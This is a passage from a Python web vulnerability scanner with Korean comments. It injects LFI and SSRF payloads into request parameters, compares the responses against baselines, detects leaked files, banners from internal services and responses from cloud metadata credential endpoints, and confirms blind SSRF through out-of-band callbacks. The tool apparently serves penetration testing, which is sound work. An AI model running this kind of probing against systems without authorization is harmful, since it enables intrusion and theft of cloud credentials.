        이후 모든 페이로드 응답과 비교할 기준점으로 사용합니다.
        """
        cache_key = self._target_cache_key(hit.target)
        if cache_key in self._baseline_cache:
            return self._baseline_cache[cache_key]
        return self.probe_target_access(hit.target).response

    # ----------------------------------------------------------------
    def _try_oob_verification(self, hit: SearchHit) -> Optional[InjectionResult]:
        """OOB 콜백 기반 SSRF 검증 (provider가 활성화된 경우만 동작)"""
        hit_id = f"{hit.target.method}:{hit.target.full_url}:{hit.param.name}"
        callback_url = self.oob_provider.register_unique_callback(hit_id)
        if not callback_url:
            return None

        try:
            self._inject_single(hit, callback_url, baseline=None, label="OOB_PROBE")
        except Exception:
            pass

        received = self.oob_provider.check_callback_received(callback_url)
        if received:
            return InjectionResult(
                hit=hit, payload=callback_url, confirmed=True,
                evidence="OOB 콜백 서버로 실제 아웃바운드 요청 수신 확인 (블라인드 SSRF 확정)",
                detection_method="OOB",
                confidence="HIGH",
            )
        return None

    # ----------------------------------------------------------------
    def _inject_single(self, hit: SearchHit, payload: str,
                        baseline: Optional[requests.Response],
                        label: str = "") -> Optional[InjectionResult]:
        target = hit.target
        param = hit.param
        url = self._build_url(hit, payload)

        kwargs = self._build_request_kwargs(hit, payload)

        request_body = kwargs.get("json") or kwargs.get("data")
        if "files" in kwargs:
            request_body = {
                name: value[1] if isinstance(value, tuple) and len(value) > 1 else value
                for name, value in kwargs["files"].items()
            }
        request_headers = dict(self.session.headers)
        request_headers.update(kwargs.get("headers", {}))
        request_headers = {
            name: "Bearer <masked>" if name.casefold() == "authorization" else value
            for name, value in request_headers.items()
        }
        request_content_type = (
            "multipart/form-data"
            if "files" in kwargs
            else target.content_type or ("application/json" if "json" in kwargs else "")
        )
        if request_content_type and not any(
            name.casefold() == "content-type" for name in request_headers
        ):
            request_headers["Content-Type"] = request_content_type

        last_exception = None
        timeout_count = 0
        connection_error_count = 0
        for attempt in range(self.retry_count + 1):
            start = time.time()
            try:
                resp = self.session.request(target.method, url, **kwargs)
                elapsed_ms = (time.time() - start) * 1000

                confirmed, evidence, detection_method = self._analyze_response(
                    hit, payload, resp, elapsed_ms, baseline
                )

                return InjectionResult(
                    hit=hit,
                    payload=f"{label}:{payload}" if label else payload,
                    confirmed=confirmed,
                    evidence=evidence,
                    response_status=resp.status_code,
                    response_time_ms=round(elapsed_ms, 1),
                    detection_method=detection_method,
                    confidence=(
                        "HIGH" if detection_method in {"IN_BAND", "IN_BAND_STORED_SSRF", "OOB", "REPEATED_TIMING"}
                        else "MEDIUM" if detection_method == "BASELINE_DIFF"
                        else "LOW"
                    ),
                    baseline_status=baseline.status_code if baseline is not None else None,
                    baseline_length=len(baseline.text) if baseline is not None else None,
                    payload_response_length=len(resp.text) if resp.text else 0,
                    response_body_snippet=self._response_body_snippet(
                        hit, confirmed, resp, baseline
                    ),
                    request_body=request_body,
                    request_headers=request_headers,
                    request_content_type=request_content_type,
                    _response_body_preview=(resp.text or "")[:500]
                    if not _is_binary_response(resp) else None,
                )

            except Timeout:
                elapsed_ms = (time.time() - start) * 1000
                timeout_count += 1
                last_exception = "Timeout"
                continue

            except ConnectionError as e:
                connection_error_count += 1
                last_exception = str(e)
                continue

            except RequestException as e:
                last_exception = str(e)
                continue

        attempts = self.retry_count + 1
        baseline_is_valid = baseline is not None and baseline.status_code not in (401, 403)
        if hit.vuln_type == VulnType.SSRF and baseline_is_valid and timeout_count == attempts:
            return InjectionResult(
                hit=hit, payload=payload, confirmed=True,
                evidence=f"정상 기준 요청은 응답했지만 SSRF 페이로드는 {attempts}회 연속 타임아웃 - 서버 측 URL 요청 가능성",
                response_time_ms=round(self.timeout * 1000, 1),
                detection_method="REPEATED_TIMING",
                confidence="HIGH",
                baseline_status=baseline.status_code,
                baseline_length=len(baseline.text),
                request_body=request_body,
                request_headers=request_headers,
                request_content_type=request_content_type,
            )

        if last_exception:
            print(f"[요청 실패] {target.method} {url} ({param.name}={payload}) -> {last_exception}")
        return None

    @staticmethod
    def _response_body_snippet(hit: SearchHit, confirmed: bool,
                               resp: requests.Response,
                               baseline: Optional[requests.Response]) -> Optional[str]:
        """Keep evidence for meaningful growth and unconfirmed LFI responses."""
        body = resp.text or ""
        if not body:
            return None

        meaningfully_increased = False
        if baseline is not None:
            baseline_length = len(baseline.text or "")
            meaningfully_increased = (
                len(body) - baseline_length
            ) / max(baseline_length, 1) >= 0.20

        signature_not_detected = hit.vuln_type in {VulnType.LFI, VulnType.RFI} and not confirmed
        if meaningfully_increased or signature_not_detected:
            return body[:1000]
        return None

    # ----------------------------------------------------------------
    def _analyze_response(self, hit: SearchHit, payload: str,
                           resp: requests.Response, elapsed_ms: float,
                           baseline: Optional[requests.Response]):
        """
        응답 본문/상태/시간 + baseline 비교를 종합하여 취약점 확정 여부를 판정합니다.
        반환: (confirmed: bool, evidence: str, detection_method: str)
        """
        body = resp.text[:200000] if resp.text else ""
        body_lower = body.lower()
        is_binary_response = _is_binary_response(resp)

        if resp.status_code in (401, 403):
            return False, "", ""

        # 1) In-band: 파일 내용 직접 노출 (가장 신뢰도 높은 증거)
        for sig_name, signatures in LEAK_SIGNATURES.items():
            for sig in signatures:
                if sig.lower() in body_lower:
                    return True, f"파일 누출 시그니처 탐지 ({sig_name}: '{sig}')", "IN_BAND"

        # 2) In-band: 내부 서비스 응답 특징 (Redis/SSH/MySQL 배너 등)
        if hit.vuln_type == VulnType.SSRF:
            for hint in INTERNAL_RESPONSE_HINTS:
                if hint.lower() in body_lower:
                    return True, f"내부 서비스 응답 특징 탐지 ('{hint}')", "IN_BAND"

            # 클라우드 메타데이터 응답 (자격증명 키워드)
            if INTERNAL_IP_PATTERN.match(payload) and any(
                h in body_lower for h in CLOUD_METADATA_LEAK_HINTS
            ):
                return True, "클라우드 메타데이터 엔드포인트 응답 탐지 (자격증명 노출 위험)", "IN_BAND"

        # enum/구조화 포맷은 자유 문자열 입력이 아니므로 응답 차이만으로 확정하지 않습니다.
        if _is_constrained_param(hit.param):
            return False, "", ""

        # 3) Baseline Diff 비교: 내부 주소 페이로드인데 baseline과 응답이 의미 있게 다른 경우
        if baseline is not None and INTERNAL_IP_PATTERN.match(payload) and not is_binary_response:
            status_changed = resp.status_code != baseline.status_code
            baseline_len = len(baseline.text) if baseline.text else 0
            payload_len = len(body)
            length_diff_ratio = (
                abs(payload_len - baseline_len) / max(baseline_len, 1)
            )

            # 409/422는 중복 생성/검증 실패일 수 있어 상태 변화만으로 확정하지 않습니다.
            conflict_transition = resp.status_code in (409, 422)
            if (status_changed and not conflict_transition) or length_diff_ratio > 0.3:
                return True, (
                    f"내부 주소 페이로드 응답이 baseline과 유의미하게 다름 "
                    f"(status: {baseline.status_code}->{resp.status_code}, "
                    f"length: {baseline_len}->{payload_len}자, "
                    f"차이율 {length_diff_ratio:.0%}) - 수동 확인 권장"
                ), "BASELINE_DIFF"

        # 4) 단순 200 OK 휴리스틱 (baseline 없을 때의 최후 수단)
        if (
            baseline is None
            and resp.status_code == 200
            and INTERNAL_IP_PATTERN.match(payload)
            and not is_binary_response
        ):
            if len(body) > 0:
                return True, (
                    f"내부 주소 페이로드에 대해 200 OK 응답 수신 "
                    f"(응답 길이 {len(body)}자) - baseline 비교 불가, 수동 확인 필요"
                ), "IN_BAND"

        return False, "", ""


# --------------------------------------------------------------------------
# 단독 실행 테스트용 헬퍼
# --------------------------------------------------------------------------
if __name__ == "__main__":
    print("payload_injector.py는 모듈로 import하여 사용합니다. main.py를 참고하세요.")
    print(f"생성된 LFI 페이로드(인코딩 변형 포함) 총 {len(LFI_PAYLOADS)}개")
    print(f"생성된 SSRF 페이로드(클라우드 메타데이터 포함) 총 {len(SSRF_PAYLOADS)}개")
